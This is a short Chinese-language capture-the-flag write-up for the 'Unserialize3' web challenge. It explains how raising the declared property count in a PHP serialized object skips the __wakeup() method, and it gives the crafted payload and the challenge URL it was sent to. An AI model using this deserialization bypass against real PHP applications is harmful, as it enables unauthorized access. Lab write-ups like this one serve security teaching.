---
title: Unserialize3
date: 2020-09-25 20:41:21
tags:
  - Writeups
  - WEB
  - unserialize
---

利用属性个数值异常跳出`__wakeup()`

<!-- more -->

首先看到

<img src="Unserialize3\first.png" style="zoom:50%;" />

> `wakeup()`漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过`wakeup`的执行。

反序列化代码

```php
<?php

class xctf{
    public $flag = '111';
    public function __wakeup(){
    exit('bad requests');
    }
}
$x = new xctf();
print(serialize($x));
?>
```

得到`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`

改为`O:4:"xctf":2:{s:4:"flag";s:3:"111";}`

访问`http://220.249.52.133:52850/?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}`

<img src="Unserialize3\flag.png" style="zoom:50%;" />